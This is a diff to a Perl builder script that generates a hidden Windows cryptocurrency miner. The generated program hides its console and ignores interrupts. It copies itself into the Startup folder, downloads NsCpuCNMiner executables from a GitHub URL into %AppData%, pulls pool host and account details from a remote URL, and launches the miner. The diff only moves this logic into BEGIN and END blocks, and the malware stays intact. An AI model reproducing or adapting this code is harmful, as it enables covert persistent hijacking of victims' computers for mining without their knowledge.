@@ -82,13 +82,9 @@ sub generate{
   open(OUTPUT, ">", "output.pl");
   print OUTPUT <<EXE;
 #!/usr/bin/perl -w
-use Win32::HideConsole qw[hide_console];
-use LWP::UserAgent qw[get agent decoded_content];
-use LWP::Simple qw[getstore];
-use Config;
-use Cwd;
 
 BEGIN {
+  use Win32::HideConsole qw[hide_console];
   \$SIG{INT} = 'IGNORE';
   hide_console;
 }
@@ -99,30 +95,36 @@ BEGIN {
 #perl2exe_include Config
 #perl2exe_include Cwd
 
-my (\$response, \$disk, \$ua) = undef;
-\$disk = getcwd;
-if(\$disk =~ m/(\\w):\\/(\\w)/){\$disk = \$1;}
-\$ua = LWP::UserAgent->new;
-\$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
-while(1){
-  if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
-    system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
-  }
-  while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
-    if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
-      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
-    }else{
-      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
+END {
+  use LWP::UserAgent qw[get agent decoded_content];
+  use LWP::Simple qw[getstore];
+  use Config;
+  use Cwd;
+  my (\$response, \$disk, \$ua) = undef;
+  \$disk = getcwd;
+  if(\$disk =~ m/(\\w):\\/(\\w)/){\$disk = \$1;}
+    \$ua = LWP::UserAgent->new;
+    \$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
+  while(1){
+    if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
+      system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
     }
-    if(-e \"NsCpuCNMiner.exe\"){
-      system(\"move NsCpuCNMiner.exe %AppData%\");
-    }else{
-      next;
+    while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
+      if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
+        getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
+      }else{
+        getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
+      }
+      if(-e \"NsCpuCNMiner.exe\"){
+        system(\"move NsCpuCNMiner.exe %AppData%\");
+      }else{
+        next;
+      }
     }
-  }
-  \$response = \$ua->get(\"$_[0]\");
-  if(\$response->decoded_content =~ m/miner->host:(\\w);email:(\\w);/){
-    system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
+    \$response = \$ua->get(\"$_[0]\");
+    if(\$response->decoded_content =~ m/miner->host:(\\w);email:(\\w);/){
+      system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
+    }
   }
 }
 EXE
